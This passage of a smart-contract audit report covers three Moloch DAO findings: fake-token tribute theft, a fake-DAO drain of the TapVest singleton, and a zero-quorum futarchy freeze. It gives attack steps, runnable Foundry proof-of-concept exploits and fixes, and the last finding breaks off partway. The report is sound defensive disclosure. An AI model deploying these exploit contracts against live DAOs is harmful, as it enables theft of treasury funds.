> **Review: Valid novel finding targeting Tribute peripheral. Medium severity accepted for peripheral scope.** This is distinct from Cantina's MAJEUR-10 (bait-and-switch): the fake-funding / undelivered-tribute payout path is a different attack vector. The root cause — `proposeTribute` does not validate that the offered ERC20 actually transfers value — is a genuine Tribute.sol design gap not previously identified. Not a Moloch.sol core finding. **V2 hardening:** validate actual token receipt (balance-before/after check) in `proposeTribute`, or require the DAO's claim to assert expected balances.

**Winfunc ID:** `4`

**CVSS Score:** `6.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`

**Vulnerability Type:** `CWE-345: Insufficient Verification of Data Authenticity`

**Source Location:** `src/peripheral/Tribute.sol:69:proposeTribute()`

**Sink Location:** `src/peripheral/Tribute.sol:153:claimTribute()`

#### Summary

An attacker can submit a fake ERC20 tribute offer in the Tribute escrow module, leading to unauthorized transfer of DAO ETH or ERC20 consideration to the proposer.

#### Root Cause

`proposeTribute` in `src/peripheral/Tribute.sol` records `offer.tribAmt = tribAmt` after calling `safeTransferFrom(tribTkn, address(this), tribAmt)`, but it never verifies how many tokens the contract actually received. `claimTribute` later trusts the stored `offer` values, pays the proposer first, and then uses `safeTransfer(tribTkn, dao, offer.tribAmt)` without validating that the DAO actually received the promised tribute amount. The low-level helpers only treat call success / optional boolean return data as proof of payment, so a malicious token can report success while moving fewer or zero tokens.

#### Impact

###### Confirmed Impact
If a DAO accepts a tribute whose `tribTkn` is a malicious ERC20, the proposer can receive real DAO assets (`ETH` or approved `forTkn` ERC20s) even though the Tribute contract never held, or never delivered, the promised `tribAmt`.

###### Potential Follow-On Impact
Even when `tribTkn` is not fully malicious but is fee-on-transfer, rebasing, or otherwise non-standard, the same exact-amount assumption can misstate escrowed balances and cause claims or cancellations to short-deliver or revert. This can mislead governance decisions and wedge pending OTC offers until manually abandoned.

#### Source-to-Sink Trace

1. **[src/peripheral/Tribute.sol:69](../src/peripheral/Tribute.sol#L69)**

   ```solidity
   function proposeTribute(address dao, address tribTkn, uint256 tribAmt, address forTkn, uint256 forAmt)
   ```

   Untrusted proposer-controlled tribute token address, tribute amount, and requested payout enter the system.

2. **[src/peripheral/Tribute.sol:89](../src/peripheral/Tribute.sol#L89)**

   ```solidity
   safeTransferFrom(tribTkn, address(this), tribAmt);
   ```

   The contract attempts to pull the tribute token but does not measure how many tokens were actually received.

3. **[src/peripheral/Tribute.sol:284](../src/peripheral/Tribute.sol#L284)**

   ```solidity
   let success := call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)
   ```

   The helper accepts low-level call success / optional return data as proof of transfer; it never validates post-transfer balances.

4. **[src/peripheral/Tribute.sol:96](../src/peripheral/Tribute.sol#L96)**

   ```solidity
   offer.tribAmt = tribAmt;
   ```

   The claimed tribute amount is stored as if it were fully escrowed, even if the token transferred less or nothing.

5. **[src/peripheral/Tribute.sol:145](../src/peripheral/Tribute.sol#L145)**

   ```solidity
   TributeOffer memory offer = tributes[proposer][dao][tribTkn];
   ```

   Claim processing later trusts the stored offer fields and only checks that caller-supplied terms match storage.

6. **[src/peripheral/Tribute.sol:157](../src/peripheral/Tribute.sol#L157)**

   ```solidity
   if (offer.forAmt > 0) { safeTransferETH(proposer, offer.forAmt); }
   ```

   In the ETH-consideration branch, the DAO pays the proposer before any validated proof that the tribute was actually delivered.

7. **[src/peripheral/Tribute.sol:174](../src/peripheral/Tribute.sol#L174)**

   ```solidity
   safeTransfer(tribTkn, dao, offer.tribAmt);
   ```

   The final tribute-delivery step again trusts token-reported success without confirming that the DAO received the promised amount.

#### Exploit Analysis

##### Attack Narrative
The attacker is a public proposer who deploys a tribute token contract whose `transferFrom` and `transfer` functions always report success but do not move balances. They submit a tribute offer advertising an attractive `tribAmt` and desired payout. Because `proposeTribute` only checks whether the low-level call succeeded, the offer is recorded as fully escrowed even though the Tribute contract holds no real tribute inventory.

Once the victim DAO accepts the offer and executes `claimTribute`, the contract deletes the offer and sends the DAO's real consideration to the proposer first. The final tribute-delivery step again trusts the malicious token's self-reported success, so the transaction completes without the DAO receiving the advertised tribute. The exploit does not require reentrancy, flash loans, or storage corruption; it relies on the escrow trusting arbitrary ERC20 behavior.

##### Prerequisites
- **Attacker Control/Position:** Control of the proposer account and of an attacker-deployed ERC20-like contract used as `tribTkn`
- **Required Access/Placement:** Unauthenticated public access to create a Tribute offer; the victim DAO must later call `claimTribute`
- **User Interaction:** Required — DAO members/operators must decide to accept and execute the tribute claim
- **Privileges/Configuration Required:** The DAO must use the Tribute module and provide the requested `forAmt` as ETH or approve the requested `forTkn`
- **Knowledge Required:** DAO address and the payout asset/amount the attacker wants to extract
- **Attack Complexity:** Low — the attacker only needs a token contract that lies about transfer success and an accepted offer

##### Attack Steps
1. Deploy a malicious `tribTkn` contract whose `transferFrom` and `transfer` return success without moving balances.
2. Call `proposeTribute(dao, tribTkn, tribAmt, forTkn, forAmt)` with an inflated `tribAmt` and desired DAO payout.
3. Let the DAO review the on-chain offer, which now appears to have `tribAmt` escrowed in `tributes[proposer][dao][tribTkn]` and in emitted events / discovery views.
4. Induce the DAO to execute `claimTribute(...)` with ETH or ERC20 consideration.
5. `claimTribute` transfers `forAmt` to the proposer, then accepts the fake tribute token's success response and completes.

##### Impact Breakdown
- **Confirmed Impact:** Real DAO assets are transferred to the proposer even though the promised tribute was never escrowed or delivered.
- **Potential Follow-On Impact:** Fee-on-transfer or rebasing tribute assets can also create misleading escrow records and stuck/short-delivery offers, depending on token semantics and how DAO operators review offers.
- **Confidentiality:** None — the code path does not expose protected data.
- **Integrity:** High — the attacker can cause unauthorized transfer of treasury assets to themselves.
- **Availability:** None — the confirmed exploit is value theft rather than service interruption.

#### Recommended Fix

Do not trust arbitrary tribute tokens to prove escrow funding or delivery via their own `transfer` return value alone. The safe fix is to restrict `tribTkn` to DAO-approved assets and to enforce exact balance-delta checks for those approved assets. In addition, deliver and validate the tribute before paying the proposer.

**Before:**
```solidity
safeTransferFrom(tribTkn, address(this), tribAmt);
...
offer.tribAmt = tribAmt;
...
if (offer.forTkn == address(0)) {
    if (offer.forAmt > 0) safeTransferETH(proposer, offer.forAmt);
} else {
    if (offer.forAmt > 0) safeTransferFrom(offer.forTkn, proposer, offer.forAmt);
}
...
safeTransfer(tribTkn, dao, offer.tribAmt);
```

**After:**
```solidity
interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
}

error UnsupportedTributeToken();
error ShortTribute();

function proposeTribute(
    address dao,
    address tribTkn,
    uint256 tribAmt,
    address forTkn,
    uint256 forAmt
) public payable nonReentrant {
    if (tribTkn != address(0) && !approvedTributeToken[dao][tribTkn]) {
        revert UnsupportedTributeToken();
    }

    if (msg.value != 0) {
        if (tribTkn != address(0)) revert InvalidParams();
        tribAmt = msg.value;
    } else {
        uint256 beforeBal = IERC20Like(tribTkn).balanceOf(address(this));
        safeTransferFrom(tribTkn, address(this), tribAmt);
        uint256 received = IERC20Like(tribTkn).balanceOf(address(this)) - beforeBal;
        if (received != tribAmt) revert ShortTribute();
    }

    TributeOffer storage offer = tributes[msg.sender][dao][tribTkn];
    offer.tribAmt = tribAmt;
    offer.forTkn = forTkn;
    offer.forAmt = forAmt;
}

function claimTribute(
    address proposer,
    address tribTkn,
    uint256 tribAmt,
    address forTkn,
    uint256 forAmt
) public payable nonReentrant {
    address dao = msg.sender;
    TributeOffer memory offer = tributes[proposer][dao][tribTkn];
    delete tributes[proposer][dao][tribTkn];

    if (tribTkn == address(0)) {
        safeTransferETH(dao, offer.tribAmt);
    } else {
        uint256 daoBefore = IERC20Like(tribTkn).balanceOf(dao);
        safeTransfer(tribTkn, dao, offer.tribAmt);
        uint256 delivered = IERC20Like(tribTkn).balanceOf(dao) - daoBefore;
        if (delivered != offer.tribAmt) revert ShortTribute();
    }

    if (offer.forTkn == address(0)) {
        if (offer.forAmt > 0) safeTransferETH(proposer, offer.forAmt);
    } else {
        if (offer.forAmt > 0) safeTransferFrom(offer.forTkn, proposer, offer.forAmt);
    }
}
```

Because a fully malicious token can also lie about `balanceOf`, the allowlist is not optional if the DAO wants cryptographic assurance that the tribute asset is real and supported. Balance-delta checks are still valuable defense against fee-on-transfer, rebasing, and other non-standard but non-malicious ERC20s.

##### Security Principle
Escrow code must verify asset custody before recording value and must verify asset delivery before releasing consideration. When arbitrary third-party token contracts are accepted, the protocol must define a trust boundary explicitly instead of assuming every contract that looks like an ERC20 is honest.

##### Defense in Depth
- Require DAO-governed allowlisting for acceptable `tribTkn` assets, and default-deny unknown tribute tokens.
- Emit the measured `actualReceived` / `actualDelivered` amounts in events so off-chain reviewers can detect mismatches immediately.
- Add dedicated tests for malicious, fee-on-transfer, and rebasing tribute tokens.
- Consider rejecting tribute claims when `forTkn` or `tribTkn` is itself a freshly deployed or otherwise unsupported asset according to DAO policy.

##### Verification Guidance
- Add a regression test using a token whose `transferFrom`/`transfer` return success without moving balances; `proposeTribute` or `claimTribute` should now revert.
- Add a test using a fee-on-transfer tribute token; the module should reject the offer or claim with `ShortTribute()` rather than paying the proposer.
- Add a happy-path test for a DAO-approved standard ERC20 showing that legitimate tributes still settle successfully.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {Tribute} from "src/peripheral/Tribute.sol";

contract FakeTribToken {
    mapping(address => uint256) public balanceOf;

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true; // report success, move nothing
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true; // report success, move nothing
    }
}

contract TributeEscrowExploitTest is Test {
    Tribute tribute;
    FakeTribToken fake;

    address proposer = address(0xBEEF);
    address dao = address(0xDA0);

    function setUp() public {
        tribute = new Tribute();
        fake = new FakeTribToken();

        vm.deal(proposer, 1 ether);
        vm.deal(dao, 10 ether);
    }

    function test_MaliciousTributeStealsEth() public {
        uint256 fakeTribAmt = 1_000_000e18;
        uint256 forAmt = 1 ether;

        vm.prank(proposer);
        tribute.proposeTribute(dao, address(fake), fakeTribAmt, address(0), forAmt);

        (uint256 storedTribAmt,, uint256 storedForAmt) = tribute.tributes(proposer, dao, address(fake));
        assertEq(storedTribAmt, fakeTribAmt, "offer recorded as fully escrowed");
        assertEq(storedForAmt, forAmt, "requested consideration stored");
        assertEq(fake.balanceOf(address(tribute)), 0, "tribute contract never received tokens");

        uint256 proposerBefore = proposer.balance;
        uint256 daoBefore = dao.balance;

        vm.prank(dao);
        tribute.claimTribute{value: forAmt}(proposer, address(fake), fakeTribAmt, address(0), forAmt);

        assertEq(proposer.balance, proposerBefore + forAmt, "attacker got paid");
        assertEq(dao.balance, daoBefore - forAmt, "dao lost ETH");
        assertEq(fake.balanceOf(dao), 0, "dao never received tribute tokens");
    }
}
```

##### Steps
1. **Add the PoC test file**
```bash
cat > test/TributeEscrowExploit.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {Tribute} from "src/peripheral/Tribute.sol";

contract FakeTribToken {
    mapping(address => uint256) public balanceOf;

    function approve(address, uint256) external pure returns (bool) { return true; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
}

contract TributeEscrowExploitTest is Test {
    Tribute tribute;
    FakeTribToken fake;
    address proposer = address(0xBEEF);
    address dao = address(0xDA0);

    function setUp() public {
        tribute = new Tribute();
        fake = new FakeTribToken();
        vm.deal(proposer, 1 ether);
        vm.deal(dao, 10 ether);
    }

    function test_MaliciousTributeStealsEth() public {
        uint256 fakeTribAmt = 1_000_000e18;
        uint256 forAmt = 1 ether;

        vm.prank(proposer);
        tribute.proposeTribute(dao, address(fake), fakeTribAmt, address(0), forAmt);

        assertEq(fake.balanceOf(address(tribute)), 0);

        uint256 proposerBefore = proposer.balance;
        uint256 daoBefore = dao.balance;

        vm.prank(dao);
        tribute.claimTribute{value: forAmt}(proposer, address(fake), fakeTribAmt, address(0), forAmt);

        assertEq(proposer.balance, proposerBefore + forAmt);
        assertEq(dao.balance, daoBefore - forAmt);
        assertEq(fake.balanceOf(dao), 0);
    }
}
EOF
```
- Expected: the test file is created successfully
2. **Run the exploit test**
```bash
forge test --match-test test_MaliciousTributeStealsEth -vv
```
- Expected: the test passes, proving that `claimTribute` completes even though `FakeTribToken` never funded or delivered the tribute

##### Verification
Confirm that the final assertions pass: the proposer's ETH balance increases by `forAmt`, the DAO's ETH balance decreases by `forAmt`, and `fake.balanceOf(address(tribute))` / `fake.balanceOf(dao)` remain zero throughout.

##### Outcome
The attacker receives real DAO consideration for a tribute that was never escrowed and never delivered. In production, the same flow applies when a DAO governance proposal or DAO-controlled account calls `claimTribute` against an attacker-chosen `tribTkn`.

</details>

---

<details>
<summary><strong>15. TapVest claim flow lets fake DAOs drain singleton balances</strong></summary>

> **Review: Valid novel finding targeting TapVest peripheral. Medium severity accepted for peripheral scope.** The fake-DAO / singleton-balance TapVest drain is a genuine design gap not previously identified. The attack — register a fake DAO in TapVest and claim against balances already held by the singleton — exploits the lack of DAO validation in `configure()`. Not a Moloch.sol core finding — targets `TapVest.sol`. **V2 hardening:** validate that `msg.sender` is a legitimate DAO (e.g., check Summoner provenance or require the DAO to confirm the configuration via a callback).

**Winfunc ID:** `12`

**CVSS Score:** `6.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-285: Improper Authorization`

**Source Location:** `src/peripheral/TapVest.sol:50:configure()`

**Sink Location:** `src/peripheral/TapVest.sol:90:claim()`

#### Summary

An attacker can register a fake DAO in TapVest and invoke the claim flow against it, leading to unauthorized theft of ETH or ERC20 balances already held by the shared singleton.

#### Root Cause

`TapVest.configure()` stores tap parameters under `taps[msg.sender]` without constraining `msg.sender` to a genuine `Moloch` instance, and `TapVest.claim()` later accepts any `dao` address and trusts that address's `allowance()` / `spendAllowance()` behavior. In `claim()`, the contract computes `claimed` from attacker-controlled external responses, updates `lastClaim`, calls `IMoloch(dao).spendAllowance(token, claimed)`, and then forwards funds from TapVest with `safeTransferETH` / `safeTransfer` without verifying that `spendAllowance()` actually delivered assets into the singleton.

#### Impact

###### Confirmed Impact
Any ETH or ERC20 balance already present at the shared `TapVest` address can be stolen by the first attacker who configures a fake DAO and calls `claim()`. This includes accidental direct transfers, forced ETH, or leftover balances caused by unexpected token behavior.

###### Potential Follow-On Impact
If integrations, users, or non-standard tokens ever leave residual balances in the singleton, those funds become public loot until drained. This issue does **not** directly let the attacker drain a real DAO treasury through `Moloch.spreadAllowance`; the confirmed impact is limited to balances that exist on `TapVest` itself.

#### Source-to-Sink Trace

1. **[src/peripheral/TapVest.sol:53](../src/peripheral/TapVest.sol#L53)**

   ```solidity
   taps[msg.sender] = TapConfig(token, beneficiary, ratePerSec, uint64(block.timestamp));
   ```

   The attacker-controlled fake DAO configures its own tap entry, choosing the payout token, beneficiary, and rate under the key that will later be used in claim().

2. **[src/peripheral/TapVest.sol:60](../src/peripheral/TapVest.sol#L60)**

   ```solidity
   TapConfig storage tap = taps[dao];
   ```

   claim() accepts an attacker-supplied dao address and loads the previously planted fake tap configuration.

3. **[src/peripheral/TapVest.sol:75](../src/peripheral/TapVest.sol#L75)**

   ```solidity
   uint256 allowance = IMoloch(dao).allowance(token, address(this));
   ```

   TapVest trusts an arbitrary external contract to report how much is claimable, so a fake DAO can return an arbitrarily large allowance.

4. **[src/peripheral/TapVest.sol:76](../src/peripheral/TapVest.sol#L76)**

   ```solidity
   uint256 daoBalance = token == address(0) ? dao.balance : balanceOf(token, dao);
   ```

   The only remaining cap is the fake DAO's visible balance, which the attacker can satisfy without transferring anything into TapVest.

5. **[src/peripheral/TapVest.sol:86](../src/peripheral/TapVest.sol#L86)**

   ```solidity
   IMoloch(dao).spendAllowance(token, claimed);
   ```

   TapVest calls the fake DAO's spendAllowance() but never verifies that the call actually delivered ETH/ERC20 into the singleton.

6. **[src/peripheral/TapVest.sol:90](../src/peripheral/TapVest.sol#L90)**

   ```solidity
   safeTransferETH(beneficiary, claimed);
   ```

   SINK: TapVest forwards ETH from its own balance to the attacker-controlled beneficiary after the unchecked external call.

7. **[src/peripheral/TapVest.sol:92](../src/peripheral/TapVest.sol#L92)**

   ```solidity
   safeTransfer(token, beneficiary, claimed);
   ```

   Equivalent ERC20 sink: any token balance already held by TapVest can be transferred out to the attacker beneficiary.

#### Exploit Analysis

##### Attack Narrative
The attacker deploys a contract that mimics the three-method `IMoloch` interface expected by `TapVest`. That fake DAO calls `TapVest.configure()` for itself, setting an attacker-controlled beneficiary and a vesting rate large enough to accrue a claimable amount after one block or one second.

Once any ETH or ERC20 balance exists on the shared `TapVest` address, the attacker calls `claim(fakeDao)`. `TapVest` trusts the fake DAO's `allowance()` response, uses the fake DAO's balance only as a cap, accepts a no-op `spendAllowance()`, and then forwards assets from its own balance to the attacker beneficiary. No real DAO approval or treasury movement is required.

##### Prerequisites
- **Attacker Control/Position:** Ability to deploy a contract and call public functions on TapVest
- **Required Access/Placement:** Unauthenticated
- **User Interaction:** None
- **Privileges/Configuration Required:** TapVest must hold some ETH or ERC20 balance at the time of attack (for example through an accidental transfer, forced ETH, or residual balance from non-standard token behavior)
- **Knowledge Required:** Address of the TapVest singleton and the token/balance to target
- **Attack Complexity:** Low — the fake DAO, beneficiary, allowance response, and no-op `spendAllowance()` are all under attacker control

##### Attack Steps
1. Deploy a fake DAO contract that implements `allowance()` and `spendAllowance()`.
2. Have the fake DAO call `TapVest.configure(token, attackerBeneficiary, ratePerSec)` so `taps[fakeDao]` is initialized.
3. Ensure the fake DAO holds at least `claimed` ETH for the ETH path, or the relevant token balance for the ERC20 path, so the `daoBalance` cap does not reduce the claim.
4. Wait until `owed = ratePerSec * elapsed` is non-zero.
5. Call `TapVest.claim(address(fakeDao))`.
6. `TapVest` calls the fake DAO's `spendAllowance()` (which does nothing) and then transfers `claimed` from TapVest's own balance to the attacker beneficiary.

##### Impact Breakdown
- **Confirmed Impact:** Unauthorized draining of ETH/ERC20 balances already present on the shared TapVest singleton.
- **Potential Follow-On Impact:** If protocol users or integrations mistakenly transfer valuable assets to the singleton, those funds are immediately claimable by any attacker who races to use a fake DAO. Real DAO treasuries are not directly drained through the confirmed code path.
- **Confidentiality:** None — the issue is fund theft, not data disclosure.
- **Integrity:** Low — the attacker can cause unauthorized asset transfers out of the singleton.
- **Availability:** Low — affected balances become unavailable to the rightful sender or intended recipient once drained.

#### Recommended Fix

Require `claim()` to verify that `spendAllowance()` actually delivered the expected assets into `TapVest` before forwarding anything to the beneficiary. The simplest fix is to snapshot TapVest's balance before and after `spendAllowance()` and revert on shortfall.

Before:
```solidity
tap.lastClaim = uint64(block.timestamp);
IMoloch(dao).spendAllowance(token, claimed);
if (token == address(0)) {
    safeTransferETH(beneficiary, claimed);
} else {
    safeTransfer(token, beneficiary, claimed);
}
```

After:
```solidity
error PullFailed();

function claim(address dao) public returns (uint256 claimed) {
    TapConfig storage tap = taps[dao];
    if (tap.ratePerSec == 0) revert NotConfigured();

    uint64 elapsed;
    unchecked {
        elapsed = uint64(block.timestamp) - tap.lastClaim;
    }

    uint256 owed = uint256(tap.ratePerSec) * uint256(elapsed);
    if (owed == 0) revert NothingToClaim();

    address token = tap.token;
    address beneficiary = tap.beneficiary;
    uint256 allowance = IMoloch(dao).allowance(token, address(this));
    uint256 daoBalance = token == address(0) ? dao.balance : balanceOf(token, dao);

    claimed = owed < allowance ? owed : allowance;
    if (claimed > daoBalance) claimed = daoBalance;
    if (claimed == 0) revert NothingToClaim();

    uint256 balBefore = token == address(0)
        ? address(this).balance
        : balanceOf(token, address(this));

    tap.lastClaim = uint64(block.timestamp);
    IMoloch(dao).spendAllowance(token, claimed);

    uint256 balAfter = token == address(0)
        ? address(this).balance
        : balanceOf(token, address(this));
    if (balAfter < balBefore + claimed) revert PullFailed();

    if (token == address(0)) {
        safeTransferETH(beneficiary, claimed);
    } else {
        safeTransfer(token, beneficiary, claimed);
    }
}
```

##### Security Principle
The beneficiary payout must be conditioned on an observed asset transfer, not on an untrusted external contract's promise that a transfer occurred. Verifying the post-call balance turns the fake DAO into an ineffective oracle because it can no longer cause TapVest to spend its own inventory without first delivering matching assets.

##### Defense in Depth
- If this module is only intended for protocol-created DAOs, gate `configure()` / `claim()` behind a registry or factory check so arbitrary contracts cannot pose as DAOs.
- Prefer per-DAO clones or direct DAO-to-beneficiary payouts to avoid shared singleton balances becoming cross-tenant loot.
- Add invariant tests that force ETH or transfer ERC20s into the singleton, then assert that fake DAO contracts cannot withdraw them.

##### Verification Guidance
- Add a regression test equivalent to the PoC above and verify `claim(fakeDao)` now reverts with `PullFailed()`.
- Re-run the existing happy-path tests in `test/TapVest.t.sol` to confirm legitimate DAO claims still succeed.
- Add a test using a fee-on-transfer or otherwise non-standard token to verify the contract either rejects short-receipt pulls or handles them according to the intended policy.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:** from the repository root, save the test below as `test/TapVestFakeDaoDrain.t.sol` and run:
```bash
forge test --match-test test_FakeDaoCanDrainStrayETH -vv
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TapVest} from "../src/peripheral/TapVest.sol";

contract FakeDao {
    function configureTap(TapVest tap, address beneficiary, uint128 ratePerSec) external {
        tap.configure(address(0), beneficiary, ratePerSec);
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function spendAllowance(address, uint256) external {
        // no-op: does not send ETH to TapVest
    }

    receive() external payable {}
}

contract TapVestFakeDaoDrainTest is Test {
    TapVest internal tap;
    address internal victim = address(0xBEEF);
    address internal attackerBeneficiary = address(0xA11CE);

    function setUp() public {
        tap = new TapVest();
    }

    function test_FakeDaoCanDrainStrayETH() public {
        FakeDao fakeDao = new FakeDao();

        // Simulate third-party ETH ending up on the singleton.
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        (bool ok,) = address(tap).call{value: 1 ether}("");
        assertTrue(ok, "victim send failed");
        assertEq(address(tap).balance, 1 ether, "tap should hold stray ETH");

        // Attacker only needs the fake DAO to report a matching ETH balance.
        vm.deal(address(fakeDao), 1 ether);
        fakeDao.configureTap(tap, attackerBeneficiary, 1 ether); // 1 ETH/sec

        vm.warp(block.timestamp + 1);

        uint256 before = attackerBeneficiary.balance;
        tap.claim(address(fakeDao));

        assertEq(attackerBeneficiary.balance - before, 1 ether, "attacker drained stray ETH");
        assertEq(address(tap).balance, 0, "singleton fully drained");
    }
}
```

##### Steps
1. **Add the PoC test file**
- Expected: the repository compiles with the added test.
2. **Run the focused test**
```bash
forge test --match-test test_FakeDaoCanDrainStrayETH -vv
```
- Expected: the test passes.
3. **Observe the balances**
- Expected: `attackerBeneficiary` receives `1 ether` even though `FakeDao.spendAllowance()` never transferred funds into `TapVest`.

##### Verification
Confirm that the final assertions show `address(tap).balance == 0` and that the attacker beneficiary gained exactly the ETH that the victim accidentally sent to `TapVest`.

##### Outcome
The attacker can steal any ETH already sitting in the shared `TapVest` singleton by configuring a fake DAO and calling `claim()`. The same pattern applies to ERC20 balances already held by the singleton when the attacker points the fake tap at that token and satisfies the `daoBalance` cap.

</details>

---

<details>
<summary><strong>16. Permissionless futarchy NO-resolution can freeze zero-quorum proposals before voting</strong></summary>

> **Review: Duplicate of KF#17 (same root cause as #1). Severity adjusted to Medium.** See #1 review. Same zero-quorum premature NO-resolution finding, different framing (freeze-only without the drain). Already catalogued and mitigated by SafeSummoner. **Severity: Medium (per KF#17, configuration-dependent).**

**Winfunc ID:** `13`

**CVSS Score:** `6.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-841: Improper Enforcement of Behavioral Workflow`

**Source Location:** `src/Moloch.sol:530:fundFutarchy()`

**Sink Location:** `src/Moloch.sol:624:_finalizeFutarchy()`

#### Summary

An attacker can permissionlessly resolve the NO side of a zero-quorum futarchy proposal in Moloch governance before any votes are cast, leading to a persistent denial of service on that proposal’s voting and execution path.

#### Root Cause

`state()` treats an opened proposal with zero tallies as `Defeated` whenever both `quorumAbsolute` and `quorumBps` are zero, because both quorum gates are skipped and the final `forVotes <= againstVotes` check evaluates true at `0 <= 0` (`src/Moloch.sol:433-478`). `fundFutarchy()` is public and can auto-open and/or enable futarchy for an arbitrary proposal id (`src/Moloch.sol:530-570`), while `resolveFutarchyNo()` allows any futarchy-enabled proposal in `Defeated` state to finalize immediately without requiring any votes (`src/Moloch.sol:573-580`). Once `_finalizeFutarchy()` sets `F.resolved = true`, `castVote()` permanently rejects further voting for that proposal (`src/Moloch.sol:365-366`).

#### Impact

###### Confirmed Impact
A public attacker can cheaply lock a specific proposal id so that no member can cast votes on it anymore and the proposal can never transition to `Succeeded` or be executed via `executeByVotes()`. If the proposal was manually funded, `cancelProposal()` is also blocked because the proposal is no longer `Active` and funded futarchy cannot be canceled.

###### Potential Follow-On Impact
On deployments created through the raw `Summoner.summon` / `Moloch.init` path, zero-quorum configurations are reachable because `init()` leaves quorum values at zero unless explicit init calls set them. An attacker can therefore repeatedly grief governance proposals as they appear, including emergency proposals, with only dust ETH funding—or with no attacker funding at all when auto-futarchy is enabled and `openProposal()` already turns `F.enabled` on.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:530](../src/Moloch.sol#L530)**

   ```solidity
   function fundFutarchy(uint256 id, address token, uint256 amount) public payable {
   ```

   A public attacker controls the proposal id and can invoke the futarchy funding path without DAO authorization.

2. **[src/Moloch.sol:541](../src/Moloch.sol#L541)**

   ```solidity
   if (snapshotBlock[id] == 0) openProposal(id);
   ```

   If the proposal is unopened, funding automatically opens it, fixing the snapshot and making the proposal state machine live.

3. **[src/Moloch.sol:545](../src/Moloch.sol#L545)**

   ```solidity
   if (!F.enabled) { ... F.enabled = true; F.rewardToken = rt; ... }
   ```

   The same public call enables futarchy for that proposal id, which is the prerequisite for later NO-resolution.

4. **[src/Moloch.sol:463](../src/Moloch.sol#L463)**

   ```solidity
   if (absQuorum != 0 && totalCast < absQuorum) return ProposalState.Active; if (bps != 0 && totalCast < mulDiv(uint256(bps), ts, 10000)) return ProposalState.Active; ... if (forVotes <= againstVotes) return ProposalState.Defeated;
   ```

   With both quorum settings at zero, the proposal does not stay Active at zero turnout; it falls through and is treated as Defeated because 0 FOR is not greater than 0 AGAINST.

5. **[src/Moloch.sol:578](../src/Moloch.sol#L578)**

   ```solidity
   if (st != ProposalState.Defeated && st != ProposalState.Expired) revert NotOk(); _finalizeFutarchy(id, F, 0);
   ```

   Anyone can resolve the NO side as soon as the zero-vote proposal is considered Defeated; no check requires any votes to have been cast.

6. **[src/Moloch.sol:624](../src/Moloch.sol#L624)**

   ```solidity
   F.resolved = true; F.winner = winner;
   ```

   The futarchy resolution latch is set irreversibly for this proposal id, turning the premature NO result into durable state.

7. **[src/Moloch.sol:366](../src/Moloch.sol#L366)**

   ```solidity
   if (F.enabled && F.resolved) revert Unauthorized();
   ```

   Future voting on the targeted proposal id is now permanently blocked, which is the denial-of-service impact.

#### Exploit Analysis

##### Attack Narrative
A public chain attacker watches for a governance action they want to suppress. Once they know the proposal id—or, in a zero-threshold deployment, even before anyone else opens it—they use the public futarchy entrypoints to attach or inherit futarchy on that proposal and force a NO-resolution while the tally is still all zeros. Because `state()` interprets a zero-vote, zero-quorum proposal as `Defeated`, the attacker does not need to win a vote; they only need to trigger the state machine.

After `resolveFutarchyNo()` runs, `_finalizeFutarchy()` sets the futarchy as resolved. From that point on, `castVote()` rejects every future vote on that proposal id. This is a protocol-level workflow break, not just a UI artifact: the proposal can no longer gather votes and cannot become executable. If auto-futarchy is enabled, the attack can be zero-cost because `openProposal()` already enables futarchy; otherwise the attacker can spend only 1 wei of ETH to create the required pool.

##### Prerequisites
- **Attacker Control/Position:** Any EOA or contract that can submit public transactions to the DAO
- **Required Access/Placement:** Unauthenticated public user
- **User Interaction:** None
- **Privileges/Configuration Required:** The DAO must have `quorumBps == 0` and `quorumAbsolute == 0`. The attack is easiest when `proposalThreshold == 0` (raw summon default), but it also works against already-opened proposals or where the attacker can temporarily satisfy the threshold with borrowed/current voting power.
- **Knowledge Required:** The attacker must know the target proposal id inputs (`op`, `to`, `value`, `data`, `nonce`, `config`) or observe an opened proposal on-chain
- **Attack Complexity:** Low — all required functions are public, no race beyond ordinary proposal visibility is needed, and the manual-funding variant costs only dust ETH

##### Attack Steps
1. Identify or predict the target proposal id.
2. If futarchy is not already enabled for that id, call `fundFutarchy(id, address(0), 1)` with 1 wei. If the proposal is unopened and the attacker can pass the threshold gate, this also auto-opens it.
3. Call `state(id)` implicitly through `resolveFutarchyNo(id)`; because both quorums are zero and no votes have been cast, the proposal is treated as `Defeated`.
4. Call `resolveFutarchyNo(id)` to finalize `_finalizeFutarchy(id, F, 0)`.
5. Any member later attempting `castVote(id, support)` now reverts because `F.enabled && F.resolved` is true.
6. The proposal can no longer become `Succeeded`, so `executeByVotes()` can never execute that governance action.

##### Impact Breakdown
- **Confirmed Impact:** Cheap, repeatable denial of service against targeted proposal ids; voting and execution for the targeted proposal are irreversibly blocked.
